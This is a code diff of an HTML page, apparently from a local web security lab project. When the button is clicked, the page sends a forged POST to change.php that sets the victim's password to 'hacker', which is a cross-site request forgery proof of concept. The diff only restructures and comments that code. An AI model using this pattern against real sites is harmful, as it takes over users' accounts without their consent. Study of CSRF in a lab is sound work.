@@ -6,16 +6,19 @@
     <title>Execute POST Request</title>
 </head>
 <body>
-    <button id="submitButton">Execute POST Request</button>
+    <h1>Execute POST Request</h1>
+    <button id="submitButton">Send POST Request</button>
 
     <script>
         document.getElementById("submitButton").addEventListener("click", function () {
-            // Prepare the POST request
+            // Create a new XMLHttpRequest object
             const xhr = new XMLHttpRequest();
-            xhr.open("POST", "/webSecProject/change.php", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            
+            // Open a POST request to the desired URL
+            xhr.open("POST", "http://localhost/webSecProject/change.php", true);
 
-            // Set headers (if needed)
+            // Set required headers
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.setRequestHeader("Cache-Control", "max-age=0");
             xhr.setRequestHeader("sec-ch-ua", '"Chromium";v="131", "Not_A Brand";v="24"');
             xhr.setRequestHeader("sec-ch-ua-mobile", "?0");
@@ -27,20 +30,23 @@
             xhr.setRequestHeader("Sec-Fetch-User", "?1");
             xhr.setRequestHeader("Sec-Fetch-Dest", "document");
             xhr.setRequestHeader("Referer", "http://localhost/webSecProject/welcome.php");
+            
+            // The 'Host' header will be automatically added by the browser.
 
-            // Data to send
-            const data = "password=hacker&confirm_password=hacker&change=change";
-
-            // Send the request
-            xhr.send(data);
-
+            // Set up a callback to handle the response
             xhr.onload = function () {
                 if (xhr.status === 200) {
                     alert("Request executed successfully!");
                 } else {
-                    alert("Request failed. Status: " + xhr.status);
+                    alert(`Request failed. Status: ${xhr.status}`);
                 }
             };
+
+            // Define the request body
+            const requestBody = "password=hacker&confirm_password=hacker&change=change";
+
+            // Send the request
+            xhr.send(requestBody);
         });
     </script>
 </body>
